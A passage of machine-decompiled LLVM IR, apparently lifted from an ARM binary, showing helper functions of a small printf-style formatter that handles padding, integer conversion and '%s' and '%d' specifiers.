  %stack_var_-20.0.lcssa = phi i32 [ %v1_8560, %dec_label_pc_85b0.preheader ], [ %v1_85a8, %dec_label_pc_85a4 ], [ %stack_var_-20.011, %dec_label_pc_85c0 ]
  br label %dec_label_pc_8630

dec_label_pc_85f4:                                ; preds = %dec_label_pc_8630
  %v2_8618 = add i32 %v3_8650, %storemerge1
  %v1_861c = inttoptr i32 %v2_8618 to i8*
  %v2_861c = load i8, i8* %v1_861c, align 1
  %v3_8620 = inttoptr i32 %v2_8654 to i8*
  store i8 %v2_861c, i8* %v3_8620, align 1
  %v1_8628 = add i32 %storemerge1, 1
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8630.preheader, %dec_label_pc_85f4
  %storemerge1 = phi i32 [ %v1_8628, %dec_label_pc_85f4 ], [ %stack_var_-24.0, %dec_label_pc_8630.preheader ]
  %v7_863c = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_8648 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_8650 = load i32, i32* %stack_var_-32, align 4
  %v2_8654 = add i32 %v3_8650, %v2_8648
  br i1 %v7_863c, label %dec_label_pc_8640, label %dec_label_pc_85f4

dec_label_pc_8640:                                ; preds = %dec_label_pc_8630
  %v3_865c = inttoptr i32 %v2_8654 to i8*
  store i8 0, i8* %v3_865c, align 1
  %v9_8664 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8664

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8560, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 1, 6, 3, 4, 0 }
  uselistorder i32 (i32)* @function_109cc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8630, { 1, 0 }
  uselistorder label %dec_label_pc_8630.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_85c0, { 1, 0 }
}

define i32 @function_8668(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8668:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8668 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8668, i32* @ip, align 4
  %v0_8678 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8684 = icmp eq i32 %v0_8678, 0
  br i1 %v2_8684, label %dec_label_pc_86b8, label %dec_label_pc_868c

dec_label_pc_868c:                                ; preds = %dec_label_pc_8668
  %v1_8690 = inttoptr i32 %v0_8678 to i32*
  %v2_8690 = load i32, i32* %v1_8690, align 4
  %v1_869c = trunc i32 %arg2 to i8
  %v3_869c = inttoptr i32 %v2_8690 to i8*
  store i8 %v1_869c, i8* %v3_869c, align 1
  %v2_86a4 = load i32, i32* %v1_8690, align 4
  %v1_86a8 = add i32 %v2_86a4, 1
  store i32 %v1_86a8, i32* %v1_8690, align 4
  %v9_86d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_86cc

dec_label_pc_86b8:                                ; preds = %dec_label_pc_8668
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_86c8 = call i32 @function_109a0(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_86c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_86cc

dec_label_pc_86cc:                                ; preds = %dec_label_pc_868c, %dec_label_pc_86b8
  %v9_86d0 = phi i32 [ %v9_86d0.pre, %dec_label_pc_868c ], [ %v3_86c8, %dec_label_pc_86b8 ]
  ret i32 %v9_86d0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_86cc, { 1, 0 }
}

define i32 @function_86d4(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_86d4:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_86d4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_86d4, i32* @ip, align 4
  %v3_86d8 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8790, label %dec_label_pc_8710

dec_label_pc_8710:                                ; preds = %dec_label_pc_86d4
  %v2_874019 = load i8, i8* %arg2, align 1
  %v2_874421 = icmp eq i8 %v2_874019, 0
  br i1 %v2_874421, label %dec_label_pc_874c, label %dec_label_pc_8724

dec_label_pc_8724:                                ; preds = %dec_label_pc_8710, %dec_label_pc_8724
  %v4_873c23 = phi i32 [ %v1_8734, %dec_label_pc_8724 ], [ %tmp, %dec_label_pc_8710 ]
  %stack_var_-40.022 = phi i32 [ %v1_8728, %dec_label_pc_8724 ], [ 0, %dec_label_pc_8710 ]
  %v1_8728 = add i32 %stack_var_-40.022, 1
  %v1_8734 = add i32 %v4_873c23, 1
  %v5_8738 = inttoptr i32 %v1_8734 to i8*
  %v2_8740 = load i8, i8* %v5_8738, align 1
  %v2_8744 = icmp eq i8 %v2_8740, 0
  br i1 %v2_8744, label %dec_label_pc_874c, label %dec_label_pc_8724

dec_label_pc_874c:                                ; preds = %dec_label_pc_8724, %dec_label_pc_8710
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_8710 ], [ %v1_8728, %dec_label_pc_8724 ]
  %v5_8758 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_8758, label %dec_label_pc_8768, label %dec_label_pc_8778

dec_label_pc_8768:                                ; preds = %dec_label_pc_874c
  %v2_8770 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8778

dec_label_pc_8778:                                ; preds = %dec_label_pc_874c, %dec_label_pc_8768
  %storemerge3 = phi i32 [ %v2_8770, %dec_label_pc_8768 ], [ 0, %dec_label_pc_874c ]
  %v1_877c = and i32 %arg4, 2
  %v2_8780 = icmp eq i32 %v1_877c, 0
  br i1 %v2_8780, label %dec_label_pc_8790, label %dec_label_pc_8788

dec_label_pc_8788:                                ; preds = %dec_label_pc_8778
  br label %dec_label_pc_8790

dec_label_pc_8790:                                ; preds = %dec_label_pc_8778, %dec_label_pc_86d4, %dec_label_pc_8788
  %stack_var_-28.0 = phi i32 [ %arg3, %dec_label_pc_86d4 ], [ %storemerge3, %dec_label_pc_8778 ], [ %storemerge3, %dec_label_pc_8788 ]
  %stack_var_-44.0 = phi i32 [ 32, %dec_label_pc_86d4 ], [ 32, %dec_label_pc_8778 ], [ 48, %dec_label_pc_8788 ]
  %v1_8794 = urem i32 %arg4, 2
  %v2_8798 = icmp eq i32 %v1_8794, 0
  br i1 %v2_8798, label %dec_label_pc_87c8.preheader, label %dec_label_pc_8804.preheader

dec_label_pc_87c8.preheader:                      ; preds = %dec_label_pc_8790
  %v5_87d016 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_87d016, label %dec_label_pc_87a4.lr.ph, label %dec_label_pc_8804.preheader

dec_label_pc_87a4.lr.ph:                          ; preds = %dec_label_pc_87c8.preheader
  %v2_87ac = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_87a4

dec_label_pc_87a4:                                ; preds = %dec_label_pc_87a4.lr.ph, %dec_label_pc_87a4
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_87a4.lr.ph ], [ %v1_87c0, %dec_label_pc_87a4 ]
  %v3_87ac = call i32 @function_8668(i32* %v2_87ac, i32 %stack_var_-44.0)
  %v3_87b0 = load i32, i32* %stack_var_-48, align 4
  %v1_87b4 = add i32 %v3_87b0, 1
  store i32 %v1_87b4, i32* %stack_var_-48, align 4
  %v1_87c0 = add nsw i32 %stack_var_-28.117, -1
  %v5_87d0 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_87d0, label %dec_label_pc_87a4, label %dec_label_pc_8804.preheader

dec_label_pc_8804.preheader:                      ; preds = %dec_label_pc_87a4, %dec_label_pc_87c8.preheader, %dec_label_pc_8790
  %v3_884827 = phi i32 [ 0, %dec_label_pc_8790 ], [ 0, %dec_label_pc_87c8.preheader ], [ %v1_87b4, %dec_label_pc_87a4 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8790 ], [ %stack_var_-28.0, %dec_label_pc_87c8.preheader ], [ 0, %dec_label_pc_87a4 ]
  %v2_88089 = load i8, i8* %arg2, align 1
  %v2_880c11 = icmp eq i8 %v2_88089, 0
  br i1 %v2_880c11, label %dec_label_pc_883c.preheader, label %dec_label_pc_87d8.lr.ph

dec_label_pc_87d8.lr.ph:                          ; preds = %dec_label_pc_8804.preheader
  %v2_87e8 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_87d8

dec_label_pc_87d8:                                ; preds = %dec_label_pc_87d8.lr.ph, %dec_label_pc_87d8
  %v4_880413 = phi i32 [ %tmp, %dec_label_pc_87d8.lr.ph ], [ %v1_87fc, %dec_label_pc_87d8 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_87d8.lr.ph ], [ %v5_8800, %dec_label_pc_87d8 ]
  %v2_87dc = load i8, i8* %stack_var_-24.012, align 1
  %v3_87dc = zext i8 %v2_87dc to i32
  %v3_87e8 = call i32 @function_8668(i32* %v2_87e8, i32 %v3_87dc)
  %v3_87ec = load i32, i32* %stack_var_-48, align 4
  %v1_87f0 = add i32 %v3_87ec, 1
  store i32 %v1_87f0, i32* %stack_var_-48, align 4
  %v1_87fc = add i32 %v4_880413, 1
  %v5_8800 = inttoptr i32 %v1_87fc to i8*
  %v2_8808 = load i8, i8* %v5_8800, align 1
  %v2_880c = icmp eq i8 %v2_8808, 0
  br i1 %v2_880c, label %dec_label_pc_883c.preheader, label %dec_label_pc_87d8

dec_label_pc_883c.preheader:                      ; preds = %dec_label_pc_87d8, %dec_label_pc_8804.preheader
  %v3_884826 = phi i32 [ %v3_884827, %dec_label_pc_8804.preheader ], [ %v1_87f0, %dec_label_pc_87d8 ]
  %v5_88446 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_88446, label %dec_label_pc_8818.lr.ph, label %dec_label_pc_8848

dec_label_pc_8818.lr.ph:                          ; preds = %dec_label_pc_883c.preheader
  %v2_8820 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8818

dec_label_pc_8818:                                ; preds = %dec_label_pc_8818.lr.ph, %dec_label_pc_8818
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_8818.lr.ph ], [ %v1_8834, %dec_label_pc_8818 ]
  %v3_8820 = call i32 @function_8668(i32* %v2_8820, i32 %stack_var_-44.0)
  %v3_8824 = load i32, i32* %stack_var_-48, align 4
  %v1_8828 = add i32 %v3_8824, 1
  store i32 %v1_8828, i32* %stack_var_-48, align 4
  %v1_8834 = add nsw i32 %stack_var_-28.37, -1
  %v5_8844 = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_8844, label %dec_label_pc_8818, label %dec_label_pc_8848

dec_label_pc_8848:                                ; preds = %dec_label_pc_8818, %dec_label_pc_883c.preheader
  %v3_8848 = phi i32 [ %v3_884826, %dec_label_pc_883c.preheader ], [ %v1_8828, %dec_label_pc_8818 ]
  store i32 %v3_86d8, i32* @fp, align 4
  ret i32 %v3_8848

; uselistorder directives
  uselistorder i32 %v1_87fc, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_8734, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8818, { 1, 0 }
  uselistorder label %dec_label_pc_87d8, { 1, 0 }
  uselistorder label %dec_label_pc_87a4, { 1, 0 }
  uselistorder label %dec_label_pc_8790, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8778, { 1, 0 }
  uselistorder label %dec_label_pc_8724, { 1, 0 }
}

define i32 @function_8858(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8858:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_885c = load i32, i32* @fp, align 4
  store i32 34916, i32* %stack_var_-4, align 4
  %v2_8860 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8860, i32* @fp, align 4
  %v1_8894 = icmp slt i32 %arg2, 0
  %v2_8894 = icmp eq i32 %arg2, 0
  br i1 %v2_8894, label %dec_label_pc_889c, label %dec_label_pc_88d0

dec_label_pc_889c:                                ; preds = %dec_label_pc_8858
  store i32 48, i32* %stack_var_-28, align 4
  %v5_88c0 = bitcast i32* %stack_var_-28 to i8*
  %v6_88c0 = call i32 @function_86d4(i32 %arg1, i8* %v5_88c0, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_8a30

dec_label_pc_88d0:                                ; preds = %dec_label_pc_8858
  %v2_88d4 = icmp eq i32 %arg4, 0
  br i1 %v2_88d4, label %dec_label_pc_8908, label %dec_label_pc_88dc

dec_label_pc_88dc:                                ; preds = %dec_label_pc_88d0
  %v7_88e0 = icmp eq i32 %arg3, 10
  br i1 %v7_88e0, label %dec_label_pc_88e8, label %dec_label_pc_8908

dec_label_pc_88e8:                                ; preds = %dec_label_pc_88dc
  br i1 %v1_8894, label %dec_label_pc_88f4, label %dec_label_pc_8908

dec_label_pc_88f4:                                ; preds = %dec_label_pc_88e8
  %v1_8900 = sub i32 0, %arg2
  br label %dec_label_pc_8908

dec_label_pc_8908:                                ; preds = %dec_label_pc_88e8, %dec_label_pc_88dc, %dec_label_pc_88d0, %dec_label_pc_88f4
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_88d0 ], [ %v1_8900, %dec_label_pc_88f4 ], [ %arg2, %dec_label_pc_88e8 ], [ %arg2, %dec_label_pc_88dc ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_88d0 ], [ 1, %dec_label_pc_88f4 ], [ 0, %dec_label_pc_88e8 ], [ 0, %dec_label_pc_88dc ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_899c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_899c4, label %dec_label_pc_89a4, label %dec_label_pc_8924.lr.ph

dec_label_pc_8924.lr.ph:                          ; preds = %dec_label_pc_8908
  %v2_8950 = add i32 %arg7, -58
  br label %dec_label_pc_8924

dec_label_pc_8924:                                ; preds = %dec_label_pc_8924.lr.ph, %dec_label_pc_895c
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_8924.lr.ph ], [ %v0_898c, %dec_label_pc_895c ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_8924.lr.ph ], [ %v5_8964, %dec_label_pc_895c ]
  %v2_8930 = call i32 @function_10328(i32 %stack_var_-48.16, i32 %arg3)
  %v7_8944 = icmp slt i32 %v2_8930, 10
  br i1 %v7_8944, label %dec_label_pc_895c, label %dec_label_pc_8948

dec_label_pc_8948:                                ; preds = %dec_label_pc_8924
  %v1_8954 = add i32 %v2_8950, %v2_8930
  br label %dec_label_pc_895c

dec_label_pc_895c:                                ; preds = %dec_label_pc_8924, %dec_label_pc_8948
  %stack_var_-60.0 = phi i32 [ %v2_8930, %dec_label_pc_8924 ], [ %v1_8954, %dec_label_pc_8948 ]
  %v4_895c = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8960 = add i32 %v4_895c, -1
  %v5_8964 = inttoptr i32 %v1_8960 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_897c = trunc i32 %fold to i8
  store i8 %v1_897c, i8* %v5_8964, align 1
  store i32 %stack_var_-48.16, i32* @r0, align 4
  store i32 %arg3, i32* @r1, align 4
  %v0_898c = call i32 @function_10218()
  %v2_899c = icmp eq i32 %v0_898c, 0
  br i1 %v2_899c, label %dec_label_pc_89a4, label %dec_label_pc_8924

dec_label_pc_89a4:                                ; preds = %dec_label_pc_895c, %dec_label_pc_8908
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_8908 ], [ %v5_8964, %dec_label_pc_895c ]
  %v2_89a8 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_89a8, label %dec_label_pc_8a0c, label %dec_label_pc_89b0

dec_label_pc_89b0:                                ; preds = %dec_label_pc_89a4
  %v3_89b0 = load i32, i32* %stack_var_0, align 4
  %v2_89b4 = icmp eq i32 %v3_89b0, 0
  br i1 %v2_89b4, label %dec_label_pc_89f4, label %dec_label_pc_89bc

dec_label_pc_89bc:                                ; preds = %dec_label_pc_89b0
  %v1_89c0 = and i32 %arg6, 2
  %v2_89c4 = icmp eq i32 %v1_89c0, 0
  br i1 %v2_89c4, label %dec_label_pc_89f4, label %dec_label_pc_89cc

dec_label_pc_89cc:                                ; preds = %dec_label_pc_89bc
  %v2_89d4 = inttoptr i32 %arg1 to i32*
  %v3_89d4 = call i32 @function_8668(i32* %v2_89d4, i32 45)
  %v3_89e4 = load i32, i32* %stack_var_0, align 4
  %v1_89e8 = add i32 %v3_89e4, -1
  store i32 %v1_89e8, i32* %stack_var_0, align 4
  br label %dec_label_pc_8a0c

dec_label_pc_89f4:                                ; preds = %dec_label_pc_89bc, %dec_label_pc_89b0
  %v4_89f4 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_89f8 = add i32 %v4_89f4, -1
  %v5_89fc = inttoptr i32 %v1_89f8 to i8*
  store i8 45, i8* %v5_89fc, align 1
  br label %dec_label_pc_8a0c

dec_label_pc_8a0c:                                ; preds = %dec_label_pc_89a4, %dec_label_pc_89cc, %dec_label_pc_89f4
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_89a4 ], [ %v5_89fc, %dec_label_pc_89f4 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_89cc ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_89a4 ], [ 0, %dec_label_pc_89f4 ], [ 1, %dec_label_pc_89cc ]
  %v3_8a14 = load i32, i32* %stack_var_0, align 4
  %v6_8a1c = call i32 @function_86d4(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_8a14, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_8a28 = add i32 %v6_8a1c, %stack_var_-52.0
  br label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_889c, %dec_label_pc_8a0c
  %storemerge2 = phi i32 [ %v2_8a28, %dec_label_pc_8a0c ], [ %v6_88c0, %dec_label_pc_889c ]
  store i32 %v3_885c, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8964, { 0, 2, 1 }
  uselistorder i32 %v2_8930, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_8a0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_895c, { 1, 0 }
  uselistorder label %dec_label_pc_8924, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 3, 0, 1, 2 }
}

define i32 @function_8a40(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8a40:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8a40 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8a40, i32* @ip, align 4
  store i32 35404, i32* %stack_var_-4, align 4
  %v2_8a48 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8a48, i32* @fp, align 4
  %stack_var_-28.428 = inttoptr i32 %arg2 to i8*
  %v2_8df429 = load i8, i8* %stack_var_-28.428, align 1
  %v2_8df831 = icmp eq i8 %v2_8df429, 0
  br i1 %v2_8df831, label %dec_label_pc_8e00, label %dec_label_pc_8a68.lr.ph

dec_label_pc_8a68.lr.ph:                          ; preds = %dec_label_pc_8a40
  %v5_8dac = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_8a68

dec_label_pc_8a68:                                ; preds = %dec_label_pc_8a68.lr.ph, %dec_label_pc_8de4
  %stack_var_-28.435 = phi i8* [ %stack_var_-28.428, %dec_label_pc_8a68.lr.ph ], [ %stack_var_-28.4, %dec_label_pc_8de4 ]
  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8a68.lr.ph ], [ %v1_8de8, %dec_label_pc_8de4 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8a68.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8de4 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8a68.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8de4 ]
  %v2_8a6c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8a70 = icmp eq i8 %v2_8a6c, 37
  br i1 %v7_8a70, label %dec_label_pc_8a78, label %dec_label_pc_8dc4

dec_label_pc_8a78:                                ; preds = %dec_label_pc_8a68
  %v1_8a7c = add i32 %stack_var_-28.4.in34, 1
  %v5_8a80 = inttoptr i32 %v1_8a7c to i8*
  %v2_8a98 = load i8, i8* %v5_8a80, align 1
  %v2_8a9c = icmp eq i8 %v2_8a98, 0
  br i1 %v2_8a9c, label %dec_label_pc_8e00, label %dec_label_pc_8aa4

dec_label_pc_8aa4:                                ; preds = %dec_label_pc_8a78
  %v2_8aa8 = load i8, i8* %v5_8a80, align 1
  %v7_8aac = icmp eq i8 %v2_8aa8, 37
  br i1 %v7_8aac, label %dec_label_pc_8dc4, label %dec_label_pc_8ab4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8aa4
  %v2_8ab8 = load i8, i8* %v5_8a80, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 45
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8af4.preheader

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-28.4.in34, 2
  %v5_8acc = inttoptr i32 %v1_8ac8 to i8*
  br label %dec_label_pc_8af4.preheader

dec_label_pc_8af4.preheader:                      ; preds = %dec_label_pc_8ac4, %dec_label_pc_8ab4
  %stack_var_-28.0.ph = phi i8* [ %v5_8a80, %dec_label_pc_8ab4 ], [ %v5_8acc, %dec_label_pc_8ac4 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8ab4 ], [ 1, %dec_label_pc_8ac4 ]
  %v4_8af42 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_8af83 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_8afc7 = icmp eq i8 %v2_8af83, 48
  br i1 %v7_8afc7, label %dec_label_pc_8adc, label %dec_label_pc_8b40.preheader

dec_label_pc_8adc:                                ; preds = %dec_label_pc_8af4.preheader, %dec_label_pc_8adc
  %v4_8af49 = phi i32 [ %v1_8ae0, %dec_label_pc_8adc ], [ %v4_8af42, %dec_label_pc_8af4.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_8aec, %dec_label_pc_8adc ], [ %stack_var_-44.0.ph, %dec_label_pc_8af4.preheader ]
  %v1_8ae0 = add i32 %v4_8af49, 1
  %v5_8ae4 = inttoptr i32 %v1_8ae0 to i8*
  %v1_8aec = or i32 %stack_var_-44.08, 2
  %v2_8af8 = load i8, i8* %v5_8ae4, align 1
  %v7_8afc = icmp eq i8 %v2_8af8, 48
  br i1 %v7_8afc, label %dec_label_pc_8adc, label %dec_label_pc_8b40.preheader

dec_label_pc_8b40.preheader:                      ; preds = %dec_label_pc_8adc, %dec_label_pc_8af4.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8af4.preheader ], [ %v1_8aec, %dec_label_pc_8adc ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8af4.preheader ], [ %v5_8ae4, %dec_label_pc_8adc ]
  %v4_8b4011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_8b4412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_8b4412, 48
  br i1 %tmp60, label %dec_label_pc_8b60, label %dec_label_pc_8b50

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8b50
  %v2_8b14 = mul i32 %stack_var_-48.019, 10
  %v2_8b20 = load i8, i8* %stack_var_-28.120, align 1
  %v3_8b20 = zext i8 %v2_8b20 to i32
  %v2_8b28 = add i32 %v2_8b14, -48
  %v1_8b2c = add i32 %v2_8b28, %v3_8b20
  %v1_8b38 = add i32 %v4_8b4021, 1
  %v5_8b3c = inttoptr i32 %v1_8b38 to i8*
  %v2_8b44 = load i8, i8* %v5_8b3c, align 1
  %tmp61 = icmp ult i8 %v2_8b44, 48
  br i1 %tmp61, label %dec_label_pc_8b60, label %dec_label_pc_8b50

dec_label_pc_8b50:                                ; preds = %dec_label_pc_8b40.preheader, %dec_label_pc_8b08
  %v4_8b4021 = phi i32 [ %v1_8b38, %dec_label_pc_8b08 ], [ %v4_8b4011, %dec_label_pc_8b40.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_8b3c, %dec_label_pc_8b08 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_8b40.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_8b2c, %dec_label_pc_8b08 ], [ 0, %dec_label_pc_8b40.preheader ]
  %v2_8b54 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_8b54, 58
  br i1 %tmp62, label %dec_label_pc_8b08, label %dec_label_pc_8b60

dec_label_pc_8b60:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8b50, %dec_label_pc_8b40.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_8b40.preheader ], [ %v1_8b2c, %dec_label_pc_8b08 ], [ %stack_var_-48.019, %dec_label_pc_8b50 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_8b40.preheader ], [ %v5_8b3c, %dec_label_pc_8b08 ], [ %stack_var_-28.120, %dec_label_pc_8b50 ]
  %v2_8b64 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b68 = icmp eq i8 %v2_8b64, 115
  br i1 %v7_8b68, label %dec_label_pc_8b70, label %dec_label_pc_8bd4

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b60
  %v1_8b74 = add i32 %stack_var_-32.133, 4
  %v1_8b80 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b80 = load i32, i32* %v1_8b80, align 4
  %v2_8b8c = icmp eq i32 %v2_8b80, 0
  br i1 %v2_8b8c, label %dec_label_pc_8ba0, label %dec_label_pc_8b94

dec_label_pc_8b94:                                ; preds = %dec_label_pc_8b70
  %v5_8b98 = inttoptr i32 %v2_8b80 to i8*
  br label %dec_label_pc_8ba8

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b70
  br label %dec_label_pc_8ba8

dec_label_pc_8ba8:                                ; preds = %dec_label_pc_8b94, %dec_label_pc_8ba0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1690c.44, i32 0, i32 0), %dec_label_pc_8ba0 ], [ %v5_8b98, %dec_label_pc_8b94 ]
  %v7_8bbc = call i32 @function_86d4(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8bc8 = add i32 %v7_8bbc, %stack_var_-40.132
  br label %dec_label_pc_8de4

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8b60
  %v2_8bd8 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8bdc = icmp eq i8 %v2_8bd8, 100
  br i1 %v7_8bdc, label %dec_label_pc_8be4, label %dec_label_pc_8c38

dec_label_pc_8be4:                                ; preds = %dec_label_pc_8bd4
  %v1_8be8 = add i32 %stack_var_-32.133, 4
  %v1_8bf4 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bf4 = load i32, i32* %v1_8bf4, align 4
  %v7_8c20 = call i32 @function_8858(i32 %tmp, i32 %v2_8bf4, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8c2c = add i32 %v7_8c20, %stack_var_-40.132
  br label %dec_label_pc_8de4

dec_label_pc_8c38:                                ; preds = %dec_label_pc_8bd4
